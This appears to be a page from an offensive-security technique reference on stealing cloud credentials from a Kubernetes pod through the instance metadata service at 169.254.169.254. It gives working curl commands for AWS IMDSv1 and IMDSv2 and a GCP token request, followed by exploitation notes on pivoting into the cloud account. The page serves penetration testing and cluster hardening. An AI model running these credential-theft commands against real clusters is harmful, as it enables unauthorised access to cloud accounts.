---
title: "Cloud metadata from pod: stealing node and workload cloud credentials"
description: "Reaching the cloud instance metadata service from a Kubernetes pod to steal the node's cloud identity, or the pod's own mapped workload identity, turning a pod foothold into cloud account access when the metadata endpoint is not blocked."
keywords:
  - instance metadata
  - IMDS
  - 169.254.169.254
  - workload identity
  - cloud credential theft
---

# Cloud metadata from pod

On a managed cluster, the node is a cloud instance with an attached role, and its metadata service is reachable at `169.254.169.254` unless explicitly blocked. A pod that reaches it steals the node's cloud credentials, and where workload identity is configured the pod has its own mapped cloud role to take instead.

```bash
# AWS IMDS (v1 if unprotected; v2 needs a token)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# GCP / Azure metadata
curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## Exploitation notes

- The node role is often broad (pull images, read secrets, manage instances); stealing it is a direct pivot into the cloud account.
- IMDSv2 and metadata firewalls are common mitigations; where present, prefer the pod's mapped [Cloud IAM via workload identity](../lateral-movement/cloud-iam-via-workload-identity.md).
- This is the same endpoint a node reaches, so a [Host network namespace](../../../container-escape/shared-host-namespaces/host-network-namespace.md) pod sees it even when the pod network blocks it.

## References

- [AWS: instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [GCP: VM metadata](https://cloud.google.com/compute/docs/metadata/overview)
